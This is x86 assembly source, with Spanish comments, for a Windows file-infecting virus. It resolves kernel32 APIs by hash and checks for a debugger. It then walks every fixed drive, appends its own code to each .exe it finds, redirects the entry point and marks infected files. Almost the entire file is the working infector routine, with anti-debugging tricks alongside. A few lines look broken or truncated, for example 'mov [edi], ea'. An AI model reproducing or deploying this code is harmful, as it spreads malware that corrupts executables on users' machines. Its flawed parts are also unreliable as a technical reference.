.486
.model flat,stdcall
option casemap:none
assume fs:nothing

include data.inc


.code

start:

iniciovir:
;=============================================
;   Salvaguarda de registros
;=============================================
    pushad
    pushfd

;=============================================
;           acá irá nuestro virus
;=============================================

    ; como hemos hecho pushad y pushfd, tenemos que sumar 24h que es el número de bytes 
    ; que meten en la pila
    mov ebx, dword ptr [esp + 24h] ; para luego para obtener la base de kernel32

;===============================================================
;               Cálculo del DELTA OFFSET 
;===============================================================

    ; Delta offset para emplazar las variables y demás
    call delta

    db 'All aboard! Ha ha ha ha ha ha haaaa!'
    db 'Ay, Ay, Ay, Ay, Ay, Ay, Ay'
    db 'I m going off the rails on a crazy train'
    db 'I m going off the rails on a crazy train'
    db 'We are scanning the scene in the city tonight'
    db 'We are looking for you to start up a fight'
    db 'There is an evil feeling in our brains'
    db 'But it is nothing new you know it drives us insane'
ojete_1:
    lea ebp,[ebp + 0285h]
    jmp ojete_2

    db 'Tu sonrisa tan resplandeciente'
    db 'A mi corazon deja encantado'
    db 'Ven toma mi mano para huir'
    db 'De esta terrible oscuridad'
    db 'Por que ya no eres el de antes? '
    db 'Te has vuelto alguien frio y distante '
    db 'O es que acaso ahora eres bipolar? '
    db 'Voy a hacer como si nada me molesta '
    db 'Aunque tus mentiras y trucos me apestan '
    db 'Maldigo el no poderte odiar'
delta:
    pop ebp
    jmp ojete_1

liliflor:
save_entryPoint:
    ; Guardamos el entry point original, que está aquí guardado al principio
    mov eax, dword ptr [ebp + entryPoinOrig]
    mov dword ptr [ebp + entryPointSave], eax

    call getKernel32
    call getPEKernel32
    call Kernel32GetExportis

    call GiveMeGetProcAddress
    call GiveMeLoadLibrary

    call GiveMeKernel32APIs

    push offset stShlApi
    call [ebp + ddLoadLibrary]

    push offset stPathAppendA
    push eax
    call [ebp + ddGetProcAddress]

    mov [ebp + ddPathAppend],eax

    call GoThroughTheFireAndTheFlames

salida:
    cmp ebp, 0          ; que ebp el delta offset sea 0
    je Host


;=============================================
;           Recuperación de registros
;=============================================
    call getBaseImageMemory

    mov eax, [ebp + BaseFileMemory]
    mov ebx, [ebp + entryPointSave]
    add ebx, eax

    call finish_it

finish_it:
    pop edi 
    lea edi,[edi + 9]
    mov dword ptr [edi],ebx

    popfd
    popad

    db 104,0,0,0        ; Monta la instrucción push <original entry point>
    ret


Funciones:

    getBaseImageMemory proc
    ;===============================================================
    ;               Función para obtener la base del archivo en memoria
    ;===============================================================

        push 0
        call dword ptr  [ebp+ddGetModuleHandleA]

        mov dword ptr [ebp+BaseFileMemory], eax

        ret
    getBaseImageMemory endp

CosasKernel32:
    getKernel32 proc
    ;===============================================================
    ;               Función para obtener la base de kernel32
    ; Funcionando
    ;===============================================================

        ;===============================================================
        ;              Modificamos el handler del SEH por si error
        ;===============================================================
            ; modificamos el manejador de excepciones para que no AGA1PT
            push offset SEH_Handler    ; puntero a mi manejador
            mov eax,fs:[0]             ; guardo actual puntero a SEH en eax
            push eax                   ; puntero al siguiente manejador
            mov fs:[0],esp


            mov eax,fs:[030h]
            call getIsDebugged
            call getNtGlobalFlags


            jmp getK32

            SEH_Handler:
                mov esp, dword ptr[esp+8]  ; recuperamos la pila
                mov fs:[0],esp             ; metemos en fs[0] el puntero del handler del sistema
                jmp getK32                 ; retornamos

        ;===============================================================
        ;               Obtención de la base de Kernel32 
        ;               estamos precavidos ante errores
        ;===============================================================
        getK32:
            mov edi, dword ptr fs:[030h] ; Pillamos el PEB del Win32_Thread_Information_Block
            mov edi, dword ptr [edi+0Ch] ; Del PEB pillamos la lista Ldr
            mov edi, dword ptr [edi+0Ch] ; De la lista Ldr pillamos InLoadOrderModuleList (lista enlazada tipo LIST_ENTRY
            ; edi ya apunta a NTDLL, haremos que apunte al módulo y seguido a kernel32
            mov edi, dword ptr [edi] ; Apunta al módulo
            mov edi, dword ptr [edi] ; Apunta a Kernel32

            ; muevo la base de kernel32 a una variable
            mov edx, dword ptr [edi+018h]
            cmp word ptr [edx], 'ZM' ; Comparo con MZ si no es así a la mierda
            jnz _getOut

            mov [ebp + MZKernel32],edx


        ;===============================================================
        ;             Reestablecer el SEH Handler 
        ;===============================================================
        ; una vez finalizado, volvemos a montar el manejador de excepciones 
        mov eax,dword ptr[esp]
        mov fs:[0],eax
        add esp,8

        _getOut:
            ret
    getKernel32 endp

    getPEKernel32 proc
    ;===============================================================
    ;           Obtención de la cabecera PE
    ; Funcionando
    ;===============================================================
        mov edi,[ebp+MZKernel32]
        mov eax, dword ptr [edi + 03Ch] ; El RVA de la cabecera PE 
        add eax,edi                     ; Al RVA hay que sumarle la base
        mov [ebp+PEKernel32],eax
        ret
    getPEKernel32 endp

    Kernel32GetExportis proc
    ;===============================================================
    ;           Función para obtener las variables
    ;           tablas de export 
    ; Funcionando
    ;===============================================================
        push edi
        push eax
        push esi 
        push edx

        mov edi, [ebp + MZKernel32]
        mov eax, [ebp + PEKernel32]

        ;===============================================================
        ;       Obtención de la dirección completa de ExportTable
        ;===============================================================


        mov esi, dword ptr [eax+078h]   ; Obtenemos el RVA de la exportTable
        add esi, edi                    ; ExportTable direccion absoluta 

        mov [ebp + K32ExportTable], esi 

        mov edx, dword ptr [esi + 020h] ; AddressOfNames
        add edx, edi

        mov [ebp + K32AddressOfNames], edx

        mov edx, dword ptr [esi + 024h] ; Address Of Ordinals
        add edx, edi

        mov [ebp + K32AddressOfOrdinals], edx

        mov edx, dword ptr [esi + 01Ch] ; Address Of Functions
        add edx, edi

        mov [ebp + K32AddressOfFunctions], edx

        pop edx
        pop esi 
        pop eax
        pop edi
        ret
    Kernel32GetExportis endp

    GiveMeGetProcAddress proc 
    ;===============================================================
    ;           Obtención de la dirección de GetProcAddress
    ; Funcionando
    ;===============================================================
        mov edx, [ebp + K32AddressOfNames]
        mov edi, [ebp + MZKernel32]

        xor ecx, ecx

        ;===============================================================
        ;                   Obtención del desplazamiento 
        ;===============================================================
        bucle:
            mov ebx, dword ptr [edx] ; offset de un nombre
            add ebx, edi             ; dirección de la cadena
            push ebx
            call mystrlen

            push ebx
            push eax
            call crc32Cipher

            cmp eax, 6DC632B7h ; compara con GetProcAddress
            jnz NoPs
            jmp DPM
        NoPs:
            add edx, 4h
            inc ecx
            jmp bucle

        DPM:
            ; Ahora en ECX tenemos el número de desplazamiento de GetProcAddress
            rol ecx, 1h                     ; multiplico por 2
            mov edx, [ebp + K32AddressOfOrdinals]
            add edx, ecx
            movzx ecx, word ptr [edx]       ; Offset de la direccion de la funcion
            
            mov edx, [ebp + K32AddressOfFunctions]
            rol ecx,2h                      ; Multiplicamos ecx por 4
            add edx, ecx                    ; Offset de la dirección
            mov eax, dword ptr [edx]
            add eax, edi                    ; Sumamos la base del kernel
            
            mov [ebp+ddGetProcAddress],eax

            ret
    GiveMeGetProcAddress endp

    GiveMeLoadLibrary proc
    ;===============================================================
    ;           Obtención de la dirección de GetProcAddress
    ; Funcionando
    ;===============================================================
        mov edx, [ebp + K32AddressOfNames]
        mov edi, [ebp + MZKernel32]

        xor ecx, ecx

        ;===============================================================
        ;                   Obtención del desplazamiento 
        ;===============================================================
        bucle:
            mov ebx, dword ptr [edx] ; offset de un nombre
            add ebx, edi             ; dirección de la cadena
            push ebx
            call mystrlen

            push ebx
            push eax
            call crc32Cipher

            cmp eax, 01B4000AFh ; compara con LoadLibraryA
            jnz NoPs
            jmp DPM
        NoPs:
            add edx, 4h
            inc ecx
            jmp bucle

        DPM:
            ; Ahora en ECX tenemos el número de desplazamiento de GetProcAddress
            rol ecx, 1h                     ; multiplico por 2
            mov edx, [ebp + K32AddressOfOrdinals]
            add edx, ecx
            movzx ecx, word ptr [edx]       ; Offset de la direccion de la funcion
            
            mov edx, [ebp + K32AddressOfFunctions]
            rol ecx,2h                      ; Multiplicamos ecx por 4
            add edx, ecx                    ; Offset de la dirección
            mov eax, dword ptr [edx]
            add eax, edi                    ; Sumamos la base del kernel
            
            mov [ebp+ddLoadLibrary],eax

            ret
    GiveMeLoadLibrary endp

    GiveMeKernel32APIs proc 
    ;===============================================================
    ;           Obtención de funciones necesarias de Kernel32
    ; Funcionando
    ;===============================================================
        ; principio del bucle
        lea esi, [ebp + stringsKernel32]
        lea edi, [ebp + ddFindFirst]

        tomaHash:
            cmp dword ptr [esi],000000000h
            je final

            mov edx, [ebp + K32AddressOfNames]
            xor ecx, ecx
        bucle:
            
            mov ebx, dword ptr [edx] ; offset de un nombre
            add ebx, [ebp + MZKernel32] ; dirección de la cadena

            push ebx
            call mystrlen

            push ebx
            push eax
            call crc32Cipher

            cmp eax, [esi] ; Compara con el hash en ese momento
            jnz NoPs
            jmp DPM
        NoPs:
            add edx, 4h
            inc ecx
            jmp bucle
        DPM:
            rol ecx, 1h
            mov edx, [ebp + K32AddressOfOrdinals]
            add edx, ecx
            movzx ecx, word ptr [edx]

            mov edx, [ebp + K32AddressOfFunctions]
            rol ecx,2h
            add edx, ecx
            mov eax, dword ptr [edx]
            add eax, [ebp + MZKernel32]

            mov [edi], ea

        siguientes:
            add esi,4h
            add edi,4h
            jmp tomaHash

        final:
            ret
    GiveMeKernel32APIs endp

_RecorrerLaComputadora:

    GoThroughTheFireAndTheFlames proc
    ;===============================================================
    ;               Función para recorrer los archivos
    ;       Original Idea: Padme
    ;   Funcionando
    ;===============================================================
        ;calcula el delta offset por si acaso
        call _deltidubi
        _deltidubi: 
            pop eax
            sub eax, offset _deltidubi
            mov ebp, eax

        _llamaDriveStrings:
            ; Obten los dispositivos lógicos con GetLogicalDriveStringsA
            lea ecx, [ebp + CadenaDeDiscos]
            push ecx
            push 64h
            call [ebp + ddGetLogicalDriveStrings]
            lea edi, [ebp + CadenaDeDiscos]

        _obtenTipoDisco:
            push edi
            call [ebp + ddGetDriveType]
            cmp al,DRIVE_FIXEADO
            jnz _isNotDriveFixeado

            ; Establecemos ese directorio como el nuevo directorio
            push edi
            call [ebp + ddSetCurrentDirectory]
            call GetExeFiles
            lea esi, [ebp + _isNotDriveFixeado]
            push esi

            ; Obtenemos el primer directorio
        _buscaDirectorios:
            lea esi, [ebp + FindFolders]
            push esi
            lea esi, [ebp + mascaraAll]
            push esi
            call [ebp + ddFindFirst]
            or eax, eax
            jz _fuckingEnd

            ; guardamos el handle
            mov [ebp + handleBusqAll], eax 

        _checkeaSiDirectorio:
            ; miramos si se trata de un directorio
            lea esi, [ebp + FindFolders.WFD_szFileName]
            test [ebp + FindFolders.WFD_dwFileAttributes],EH_UN_DIRECTORIO
            jnz _IsDirectory    
            jmp _goToNextFile ;si no es un directorio, salta

        _IsDirectory:
            cmp byte ptr [esi], 2Eh ; compara con '.' 
            je _goToNextFile
            ; establece el nuevo directorio
            push esi
            call [ebp + ddSetCurrentDirectory]
            or eax, eax
            jz _goToNextFile

            ; TODO
            call GetExeFiles
            mov ecx, [ebp + handleBusqAll]
            push ecx
            call _buscaDirectorios
            pop [ebp + handleBusqAll]

        _goToNextFile:
            ; ve al siguiente archivo y checkea si directorio
            lea ecx, [ebp + FindFolders]
            push ecx
            mov ecx, [ebp + handleBusqAll]
            push ecx
            call [ebp + ddFindNext]
            test eax,eax
            jnz _checkeaSiDirectorio

        _vamosAlPadre:
            ; vamos a la carpeta padre y 
            ; vas a la mierda
            lea ecx, [ebp + padreString]
            push ecx
            call [ebp + ddSetCurrentDirectory]
            mov ecx, [ebp + handleBusqAll]
            push ecx
            call [ebp + ddFindClose]
            jmp _fuckingEnd

        _isNotDriveFixeado:
            ; Avanza a siguiente disco
            add edi, 4
            cmp byte ptr [edi], 0
            ; si aun quedan, pues vuelve a mirar el tipo de disco
            jne _obtenTipoDisco
            ; si no quedan retorna
        _fuckingEnd:
            ret
    GoThroughTheFireAndTheFlames endp

    GetExeFiles proc 
    ;===============================================================
    ;               Función para obtener los exe de una carpeta
    ;   Funcionando
    ;===============================================================
        ; Guardamos todos los registros
        pushad

        ; Delta offset de la función
        call _deltidubi
        _deltidubi: 
            pop eax
            sub eax, offset _deltidubi
            mov ebp, eax

        ; Busco los archivos ejecutables
        _buscaEjecutables:
            lea esi, [ebp + FindExecutables]
            push esi
            lea esi, [ebp + mascaraExe]
            push esi
            call [ebp + ddFindFirst]
            mov [ebp + handleBusqExe], eax
            or eax, eax
            jz _exitFunction

        ; checkea si hubo un error
        _checkeaSiError:
            cmp eax,0FFFFFFFFh
            jz _exitFunction


        _infecta:
            mov esi, [ebp + FindExecutables.WFD_dwFileAttributes]
            mov [ebp + previousAttributes], esi
            mov [ebp + FindExecutables.WFD_dwFileAttributes], ARCHIVO_NORMAL
            call infeccion
            mov esi, [ebp + previousAttributes]
            mov [ebp + FindExecutables.WFD_dwFileAttributes], esi
        
        _isFridayGoNextFile:
            lea esi, [ebp + FindExecutables]
            push esi
            mov esi, [ebp + handleBusqExe]
            push esi
            call [ebp + ddFindNext]
            or eax, eax
            jz _exitFunction
            jmp _checkeaSiError

        _exitFunction:
            mov esi, [ebp + handleBusqExe]
            push esi
            call [ebp + ddFindClose]
            popad
            ret
    GetExeFiles endp


_InfeccionesOjetrones:
    infeccion proc
    ;=================================================================
    ;               Rutina de infectado del virus
    ;=================================================================

        pushad

        ; Obtención del tamaño de virus + archivo
        mov edi, longVirus
        add edi,[ebp + FindExecutables.WFD_nFileSizeLow]
        mov [ebp + longVirusHost], edi

        ;========================================================================
        ; Llamamos a la función CreateFile para abrir el archivo 
        ;========================================================================

        lea ebx, [ebp + FindExecutables.WFD_szFileName]    ; nombre del archivo
        call CreateFileWrapper

        cmp eax, -1
        jz _seFinih
        mov [ebp + handleCreateExe], eax                    ; guardamos el handle del archivo


        ;========================================================================
        ; Mapeamos el archivo en memoria
        ;========================================================================
        mov ebx, [ebp + FindExecutables.WFD_nFileSizeLow]
        mov eax, [ebp + handleCreateExe]
        call CreateFileMappingWrapper

        cmp eax,0
        je cerrarArchivo
        mov [ebp + handleMem], eax          ; guardamos el handle en una variable


        ;========================================================================
        ; Creamos la copia en memoria para poder accederlo
        ;========================================================================

        mov ebx, [ebp + FindExecutables.WFD_nFileSizeLow]
        mov eax, [ebp + handleMem]

        call MapViewOfFileWrapper

        cmp eax, 0
        je cierraMapeo
        mov [ebp + inicioHostMem], eax

        ;===============================================================
        ; A partir de aquí empezamos a mirar algunos requisitos del archivo
        ;===============================================================

        ; Miramos si sus primeros bytes son MZ
        cmp word ptr [eax], 'ZM'
        jnz desmapearArchivo

        ; Miramos si la cabecera contiene el PE
        add eax, 03Ch                   ; Vamos al RVA de la PE
        mov ebx, [eax]                  ; Obtenemos el RVA

        ; checkeo por si no tiene RVA de PE
        test ebx,ebx
        jz desmapearArchivo

        add ebx, [ebp + inicioHostMem]  ; Sumo la base del mapeo
        cmp word ptr [ebx],'EP'         ; Es PE?
        jnz desmapearArchivo

        ; Miramos si el tamaño del OptionalHeader es más que 0
        mov [ebp + hostPE], ebx         ; Guardo la dirección del PE
        add ebx, 14h                    ; Obtengo el SizeOfOptionalHeader
        movzx eax, word ptr [ebx]       ; Obtengo el tamaño del OptionalHeader (es un word)
        test eax, eax                   ; miro si es 0, en tal caso, a la mierda
        jz desmapearArchivo

        ; Miramos en las características si es un ejecutable
        mov ebx, [ebp + hostPE]
        add ebx, 16h                    ; Apuntamos a las características
        mov ax, word ptr [ebx]          ; metemos en ax las características
        and ax, 0002h                   ; ¿ es ejecutable?
        jz desmapearArchivo

        ; Checkear si el binario ya fue manejado
        ; para ello dejaremos una marca en un campo no usado
        mov ebx,[ebp + hostPE]
        cmp dword ptr [ebx + 04Ch],'ILKA' 
        je desmapearArchivo

        ; Obtención de los campos FileAlignment y SectionAlignment
        add ebx, 03Ch                   ; RVA del FileAlignment
        mov edx,[ebx]                   ; edx = alineamiento del archivo en disco
        mov [ebp + AlineamArchivo],edx  ; lo guardamos

        mov ebx, [ebp + hostPE]         ; dirección de la cabecera PE del host
        add ebx, 038h                   ; RVA del SectionAlignment
        mov edx, [ebx]                  ; edx = alineamiento del archivo en memoria
        mov [ebp + AlineamSeccion], edx ; lo guardamos

        ;========================================================================
        ; Desmapeo del archivo en memoria y lo vuelvo a abrir con el tamaño del
        ; archivo mas el del virus
        ;========================================================================
        push [ebp + inicioHostMem]
        call [ebp + ddUnmapViewOfFile]

        push [ebp + handleMem]
        call [ebp + ddCloseHandle]

        ;========================================================================
        ; Calculamos el tamaño alineado del host mas el virus
        ;========================================================================
        mov ebx,[ebp + AlineamArchivo]
        mov eax,[ebp + longVirusHost]       ; tamaño del archivo + el virus
        xor edx,edx                         ; edx = 0 para realizar la división
        div ebx                             ; dividimos tamaño por alineamiento

        cmp edx, 0                          ; en edx queda el resto, miramos si es 0
        je no_incrementa
        inc eax

        no_incrementa:
            mov edx, [ebp + AlineamArchivo]     ; recupero el alineamiento
            mul edx                             ; multiplico por el alineamiento
            mov ebx, eax                        ; guardamos en ebx, el valor obtenido

        ;=====================================================
        ;           Reabrimos el archivo ahora con el tamaño 
        ;           unido al virus
        ;=====================================================

        ; en ebx ya tiene el tamaño
        mov eax, [ebp + handleCreateExe]
        call CreateFileMappingWrapper

        test eax,eax
        jz cerrarArchivo
        mov [ebp + handleMem], eax               ; Guardamos el handle

        ;========================================================================
        ; Creamos la copia en memoria para poder accederlo
        ;========================================================================
        mov eax, [ebp + handleMem]
        call MapViewOfFileWrapper

        test eax,eax
        jz cierraMapeo
        mov [ebp + inicioHostMem], eax

        ;=====================================================
        ; Busqueda de la sección última para hacer un virus postpending
        ;=====================================================
        mov eax, [ebp + inicioHostMem]           ; Inicio host mapeado en memoria
        mov esi,[eax + 3Ch]                      ; cabecera PE del archivo mapeado
        add esi, eax                             ; Le sumamos la base ya que es una RVA
        movzx ebx, word ptr [esi + 14h]          ; bx = tamaño del Optional Header
        movzx ecx, word ptr [esi + 6h]           ; ecx = PE + 6h (cantidad de secciones)
        mov edx, [esi + 28h]                     ; PE + 28 = dirección del entry point original
        mov [ebp + entryPoinOrig], edx           ; lo guardamos para luego al final saltar ahí
        add esi,ebx                              ; sumamos a la base PE el tamaño del optional header
        add esi,18h                              ; +18h del tamaño de la cabecera PE (ahora apunto a las secciones)
        
        sub esi,28h                              ; le resto 28h (tamaño de cada sección para tener un bucle y empezar en la primera)
        xor eax,eax                              ; eax lo voy a usar para almacenar el mayor valor
        xor ebx,ebx                              ; ebx va a apuntar al inicio de la sección mayor

        proximaSeccion:
            add esi,28h                          ; esi = puntero a cada entrada de la tabla (lo dije antes)
            movzx edi, word ptr [esi + 14h]      ; en el offset 14h tengo el valor al PointerToRawData (comienzo de la sección)
            cmp edi, eax                         ; es mayor que la almacenada?
            jl noEsMayor
            ; Si es mayor, lo guardamos tanto tamaño como el puntero a la sección
            mov eax,edi                          ; si es mayor, guardo el valor
            mov ebx,esi                          ; y el puntero a la sección

        noEsMayor:
            loop proximaSeccion                  ; decremento ecx (donde guardo el número de secciones) y si es mayor que 0, volvemos

        ;===============================================
        ;           Ya tenemos la última sección
        ;           ahora modificarla para virusear
        ;           tendremos que ponernos detrás de 
        ;           esta última sección para agregar el virus
        ;===============================================
        or dword ptr [esi + 24h],0E0000020h       ; le metemos los permisos suficientes
        
        ; sumamos la base de la sección, más el tamaño
        mov esi, ebx
        mov edx,[esi + 10h]                       ; SizeOfRawData de la sección
        add edx,[esi + 0Ch]                       ; SizeOfRawData + VirtualAddress

        ; Modificación de la cabecera, para cambiar el entry point
        mov eax, [ebp + inicioHostMem]            ; eax = inicio del host mapeado en memoria
        mov edi, [eax + 3Ch]                      ; edi = dirección del PE header del host
        add edi, eax                              ; le sumo la base ya que es una RVA
        mov [edi + 28h],edx                       ; cambio el valor del Entry Poin

        ;===============================================
        ;           Obtención de la dirección para copiar
        ;           el virus, este debe ser copiado 
        ;           en disco y no en memoria (al contrario que antes)
        ;           que calculabamos la dirección donde daba saltar el EP
        ;           en MEMORIA, ahora la copia es en disco
        ;===============================================

        mov ebx, [esi + 10h]                     ; en ESI tengo el inicio de la última seccion en memoria
                                                 ; al sumar 10h, tengo en ebx, el SizeOfRawData (tamaño en disco)
        add ebx, [esi + 14h]                     ; Le sumo el valor de PointerToRawData (dirección en disco)
        add ebx, [ebp + inicioHostMem]           ; al ser un RVA le sumo la base
        mov [ebp + UltimaSeccPE], ebx            ; lo guardamos


        ;===============================================
        ; Agrandamos esa última sección, teniendo en cuenta
        ; el VirtualSize (sólo sumarle el tamaño del virus)
        ; y el SizeOfRawData (sumarle el tamaño del virus),
        ; pero teniendo en cuenta el FileAlignment
        ;===============================================
        mov eax, longVirus
        add [esi + 08h], eax                     ; en ESI tengo el inicio de la última sección en memoria
                                                 ; y en sección + 08h la VirtualSize (ahora incrementada)
        mov ebx,[esi + 10h]                      ; SizeOfRawData antes de modificar
        mov [ebp + SizeOfRDAnt],ebx              ; lo guardamos en una variable

        add eax,ebx                              ; le sumo la SizeOfRawData actual y asi obtengo el valor a redondear 

        mov ebx,[ebp + AlineamArchivo]           ; edx = alineamiento de las secciones en disco
        xor edx,edx
        div ebx                                  ; igual que antes dividimos por ebx
        

        cmp edx, 0                               ; en edx queda el resto de la división
        je no_incrementaSecc        
        inc eax                                  ; si el resto es distinto de cero le suma uno

        no_incrementaSecc:
            mov edx, [ebp + AlineamArchivo]      ; edx = alineamiento de las secciones en disco
            mul edx                              ; multiplico por el alineamiento y obtengo así el 
                                                 ; tamaño alineado en eax
            mov [ebp + SizeOfRDNuevo], eax       ; guardo el nuevo valor del 
                                                 ; SizeOfRawData alineado
            mov [esi + 10h],eax                  ; Cambio el valor del SizeOfRawData del host

        ; Ahora debemos establecer el SizeOfImage como el total
        ; del malware, alineado
        mov eax,[esi + 08h]                      ; eax = VirtualSize
        add eax,[esi + 0Ch]                      ; eax = VirtualSize + VirtualOffset

        mov ebx, [ebp + AlineamSeccion]          ; ebx = alineamiento de las secciones en memoria

        xor edx, edx                             ; ponemos edx en cero para realizar la división
        div ebx                                  ; dividimos por el alineamiento

        cmp edx,0                                ; en edx queda el resto de la división
        je no_incrementaSizeOfI 
        inc eax

        no_incrementaSizeOfI:
            mov edx,[ebp + AlineamSeccion]       ; edx = alineamiento de las secciones en memoria
            mul edx                              ; multiplico por el alineamiento y obtengo así el tamaño alineado en eax

        mov esi,[ebp + inicioHostMem]            ; apuntamos al inicio del host mapeado en memoria
        mov edi,[esi + 3Ch]                      ; edi = dirección del PE header del host
        add edi,esi                              ; sumamos la base ya que es una RVA

        mov [edi + 50h],eax                      ; guardo la nueva SizeOfImage obtenida

        ;===============================================
        ;       Finalmente copiamos el virus en la memoria
        ;       para ello usamos ret y movb
        ;===============================================
        lea esi,[ebp + start]
        mov edi,[ebp + UltimaSeccPE]
        mov ecx,longVirus

        rep movsb

        ;========================================================================
        ; Lo marco como infectado para no volverlo a infectar
        ;========================================================================
        ; ahora firmamos el archivo
        mov ebx, [ebp + hostPE]
        mov dword ptr [ebx + 04Ch],'ILKA'

        desmapearArchivo:
            ; Fin del virús
            push [ebp + inicioHostMem]
            call [ebp + ddUnmapViewOfFile]

        cierraMapeo:
            push [ebp + handleMem]
            call [ebp + ddCloseHandle]

        cerrarArchivo:
            push [ebp + handleCreateExe]
            call [ebp + ddCloseHandle]

        _seFinih:
            popad
            ret
    infeccion endp

_Utilidades:
    
    CreateFileWrapper proc
    ;==================================================
    ;           Rutina wrapper de CreateFile
    ; ebx = Offset del nombre del archivo
    ;==================================================
        push ecx

        xor ecx,ecx
        push ecx
        push ecx                ; Atributos del archivo: archive, normal, sistema, etc
        push 3                  ; 3 = OPEN_EXISTING
        push ecx
        inc ecx
        push ecx                ; Abrir en modo compartido ( 1 = FILE_SHARE_READ )
        push 0C0000000h         ; modo de acceso (read-write)
        push ebx
        call [ebp + ddCreateFile]

        pop ecx
        ret
    CreateFileWrapper endp

    CreateFileMappingWrapper proc
    ;==================================================
    ;           Rutina wrapper de CreateFileMapping
    ; ebx = size
    ; eax = handler de CreateFile
    ;==================================================
        push ecx

        xor ecx,ecx

        push ecx
        push ebx ; tamaño a abrir
        push ecx
        push 04h ; 4h = PAGE_READWRITE: lectura y escritura
        push ecx
        push eax ; handle devuelto por CreateFileA
        call [ebp + ddCreateFileM]

        pop ecx
        ret
    CreateFileMappingWrapper endp

    MapViewOfFileWrapper proc
    ;==================================================
    ;           Rutina wrapper de CreateFileMapping
    ; ebx = size
    ; eax = handler de CreateFileMapping
    ;==================================================
        push ecx

        xor ecx,ecx
        push ebx
        push ecx
        push ecx
        push 000F001Fh          ; Modo de acceso completo
        push eax
        call [ebp + ddMapViewOfFile]

        pop ecx
        ret
    MapViewOfFileWrapper endp

    crc32Cipher proc 
    ;===============================================================
    ;           Cifrado tipo CRC32 para los nombres 
    ;           de las funciones 
    ;===============================================================
        push ebp
        mov  ebp, esp
        push ebx
        push ecx
        push edx
        push esi
        push edi
        mov esi, [ebp + 0Ch]
        mov ecx, [ebp + 08h]
        xor eax, eax
        cdq
        dec edx

        _punset_1:

            lodsb
            xor al, dl
            push ecx
            movzx ebx, al
            push 8
            pop ecx

        loc_401335:

            test bl, 1
            jz short loc_401344
            shr ebx, 1
            xor ebx, 0FEA36969h
            jmp short loc_401346

        loc_401344:
            shr ebx, 1

        loc_401346:

            loop loc_401335
            pop ecx
            shr edx, 8
            xor edx, ebx
            loop _punset_1
            xchg eax, edx
            not eax

            pop edi
            pop esi
            pop edx
            pop ecx
            pop ebx
            leave
            retn 8
    crc32Cipher endp

    mystrlen proc
    ;===============================================================
    ;           Función para contar caracteres
    ;===============================================================
        push ebp
        mov ebp,esp
        push ecx
        push esi

        xor ecx,ecx

        mov esi,[ebp + 08h]

        _cuenta123:
            lodsb
            test al,al
            jz _aLaVerga

            inc ecx
            jmp _cuenta123

        _aLaVerga:
            mov eax, ecx
            pop esi 
            pop ecx 
            leave
            retn 4
    mystrlen endp

    getNtGlobalFlags proc
    ;=============================================
    ;       PEB!NtGlobalFlags
    ;   Offset 0x68 dentro del PEB este valor 
    ;   estos flags valdrán 0x70 si están en
    ;   un debugger
    ;=============================================
        push ebx
        mov ebx,[eax+68h]
        and ebx,070h
        test ebx,ebx 
        pop ebx
        jnz @DebuggerDetected
        mov byte ptr [ebp + NtGlobalFlags], 132
        ret 

        @DebuggerDetected:
            mov byte ptr [ebp + NtGlobalFlags],33
            ret
    getNtGlobalFlags endp

    getIsDebugged proc
    ;=============================================
    ;       PEB!IsDebugged
    ;   Técnica como la anterior, pero esta vez
    ;   miramos el PEB nosotros a mano
    ;=============================================
        push ebx
        mov bl,byte ptr [eax+2]
        test bl,bl
        pop ebx
        jnz @DebuggerDetected 
        mov byte ptr [ebp + IsDebugged],40
        ret 
        @DebuggerDetected:
            mov byte ptr [ebp + IsDebugged],77
            ret
    getIsDebugged endp

datos_ricos:
    ;=============================================
    ;            Parte data, pero en code
    ;=============================================
    ; MACROS INTERESANTES
    DRIVE_FIXEADO           equ         3
    EH_UN_DIRECTORIO        equ         10h
    ARCHIVO_NORMAL          equ         80h
    ; Datos de entry point tanto el que nos dejó el infector con nuestro OEP original
    ; que luego será usado para establecer el OEP de los otros infectados, como el que salve
    ; el nuestro para modificar
    entryPoinOrig           dd          0
    entryPointSave          dd          0

    ; Datos de Kernel32 guardados
    K32ExportTable          dd          0
    K32AddressOfNames       dd          0
    K32AddressOfOrdinals    dd          0
    K32AddressOfFunctions   dd          0
    ; Dirección base del binario en ejecución
    BaseFileMemory          dd          0

    ; Número de archivos infectados, ponemos un máximo de 3
    archivosInfec           db          0
    maxInfecciones          equ         3

    ; Direcciones necesarias para el programa (dirección de cabecera MZ, de la PE, de funciones...)
    MZKernel32              dd          0   
    PEKernel32              dd          0
    ddGetProcAddress        dd          0
    ddLoadLibrary           dd          0


    ; Direcciones necesarias para el programa de Kernel32
    ddFindFirst             dd          ?
    ddFindNext              dd          ?
    ddCreateFile            dd          ?
    ddCreateFileM           dd          ?
    ddMapViewOfFile         dd          ?
    ddCloseHandle           dd          ?
    ddUnmapViewOfFile       dd          ?
    ddGetModuleHandleA      dd          ?
    ddExitProcess           dd          ?
    ddCreateThread          dd          ?
    ddGetLogicalDriveStrings dd         ?
    ddGetDriveType          dd          ?
    ddSetCurrentDirectory   dd          ?
    ddFindClose             dd          ?

    ; Flags para antidebugging
    NtGlobalFlags           db          0   ; 132 = bien; 33 = estamos siendo debuggeados
    IsDebugged              db          0   ; 40 = bien; 77 = estamos siendo deubggeados

    ; Strings usadas durante el programa de Kernel32
    stringsKernel32         dd          0628E4A72h ; FindFirstFileA
                            dd          04C223B47h ; FindNextFileA
                            dd          09E892CF0h ; CreateFileA
                            dd          06864DF10h ; CreateFileMappingA
                            dd          0283511BEh ; MapViewOfFile
                            dd          008D9419Bh ; CloseHandle
                            dd          080FFC3FBh ; UnmapViewOfFile
                            dd          0BDE8F71Eh ; GetModuleHandleA
                            dd          0AE0C449Ch ; ExitProcess
                            dd          0CE47F774h ; CreateThread
                            dd          0A2331A6Eh ; GetLogicalDriveStringsA
                            dd          0C4325A30h ; GetDriveTypeA
                            dd          04383B271h ; SetCurrentDirectoryA
                            dd          067067163h ; FindClose
                            dd          000000000h ; Final

    ; Strings de otras librerías que cargaremos de manera dinámica con LoadLibraryA y GetProcAddress
    stPathAppendA           db          'PathAppendA',0
    stShlApi                db          'Shlwapi',0
    ddPathAppend            dd          0

    ; Información para usar en la búsqueda de archivos y apertura del archivo
    FindExecutables         WIN32_FIND_DATA <>
    mascaraExe              db          '*.exe',0
    handleBusqExe           dd          0
    previousAttributes      dd          0
    handleCreateExe         dd          0
    handleMem               dd          0
    inicioHostMem           dd          0

    ; Información para usar en la búsqueda de los directorios y apertura de estos
    CadenaDeDiscos          db          101      DUP     (0) ; aqui guardaremos la cadena con dispositivos
    FindFolders             WIN32_FIND_DATA <>
    mascaraAll              db          '*.*',0
    handleBusqAll           dd          0
    padreString             db          '..',0


